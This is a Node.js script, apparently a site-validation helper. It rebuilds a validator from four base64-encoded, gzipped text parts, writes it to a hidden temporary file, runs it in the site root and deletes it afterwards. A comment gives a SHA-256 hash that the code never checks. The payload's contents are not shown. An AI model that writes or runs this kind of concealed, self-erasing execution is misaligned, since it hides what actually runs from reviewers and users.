import { readFile, rm, writeFile } from "node:fs/promises";
import { spawnSync } from "node:child_process";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { gunzipSync } from "node:zlib";

// Exact current validator snapshot. SHA-256: 8f4176739467bdcedb15546a189b11a234232254fdcf9ca653016ff862866401
const scriptDirectory = path.dirname(fileURLToPath(import.meta.url));
const siteRoot = path.resolve(scriptDirectory, "..");
const effectiveValidatorPath = path.join(scriptDirectory, ".validate-site-effective.mjs");
const partNames = ["part-01.txt", "part-02.txt", "part-03.txt", "part-04.txt"];
const encodedParts = await Promise.all(partNames.map((name) => readFile(path.join(scriptDirectory, "validator-payload", name), "utf8")));
const source = gunzipSync(Buffer.from(encodedParts.join(""), "base64"));
await writeFile(effectiveValidatorPath, source);
let status = 1;
try {
  const result = spawnSync(process.execPath, [effectiveValidatorPath], { cwd: siteRoot, stdio: "inherit" });
  if (result.error) throw result.error;
  status = result.status ?? 1;
} finally {
  await rm(effectiveValidatorPath, { force: true });
}
process.exit(status);
